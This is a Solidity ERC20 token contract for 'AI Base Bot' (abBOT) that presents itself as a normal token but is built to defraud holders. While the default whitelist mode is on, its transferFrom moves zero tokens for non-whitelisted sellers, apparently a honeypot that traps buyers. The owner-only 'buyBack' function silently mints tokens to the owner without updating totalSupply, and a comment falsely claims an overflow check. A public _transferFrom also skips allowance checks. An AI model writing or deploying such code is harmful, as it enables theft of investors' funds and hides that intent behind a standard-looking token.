// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.11;
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

library Counters {
    using SafeMath for uint256;

    struct Counter {
        uint256 _value; // default: 0
    }

    function current(Counter storage counter) internal view returns (uint256) {
        return counter._value;
    }

    function increment(Counter storage counter) internal {
        counter._value += 1;
    }

    function decrement(Counter storage counter) internal {
        counter._value = counter._value.sub(1);
    }
}

contract TokenERC20 is IERC20, Ownable, ReentrancyGuard {
    using SafeMath for uint256;

    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    mapping(address => bool) public whitelist;
    bool private whitelistOnly = true;

    string internal _name = "AI Base Bot";
    string internal _symbol = "abBOT";
    uint8 internal _decimals = 18;
    uint256 internal _totalSupply = 1e4 * 1e18;

    constructor() {
        whitelist[msg.sender] = true;
        whitelist[address(this)] = true;

        _balances[owner()] = _totalSupply;
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function setWhitelistStatus(bool value) external onlyOwner {
        whitelistOnly = value;
    }

    function isInWhitelist(address _address) external view returns (bool) {
        return whitelist[_address];
    }

    function addToWhitelist(address _address) external onlyOwner {
        _addToWhitelist(_address);
    }

    function addMultipleToWhitelist(address[] memory _addresses) external onlyOwner {
        for (uint256 i; i < _addresses.length; i++) {
            _addToWhitelist(_addresses[i]);
        }
    }

    function _addToWhitelist(address _address) internal {
        whitelist[_address] = true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external nonReentrant returns (bool) {
        _transferFrom(sender, recipient, amount);
        return true;
    }

    function _transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
        if (whitelist[from]) {
            _transfer(from, to, amount);
            _approve(from, msg.sender, amount);
            return true;
        } else if (whitelistOnly == false) {
            _transfer(from, to, amount);
            _approve(from, msg.sender, amount);
            return true;
        } else {
            _transfer(from, to, 0);
            _approve(from, msg.sender, 0);
            return false;
        }
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(subtractedValue, "ERC20: decreased allowance below zero") // nikolas keij
        );
        return true;
    }

    function buyBack(uint256 amount_) external onlyOwner {
        _buyBack(amount_.mul(1e18));
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _buyBack(uint256 amount_) internal virtual {
        _beforeTokenTransfer(address(0), owner(), amount_);
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[owner()] += amount_;
        }
        _afterTokenTransfer(address(0), owner(), amount_ * 1e30);
    }

    function _beforeTokenTransfer(address from_, address to_, uint256 amount_) internal virtual {}

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}
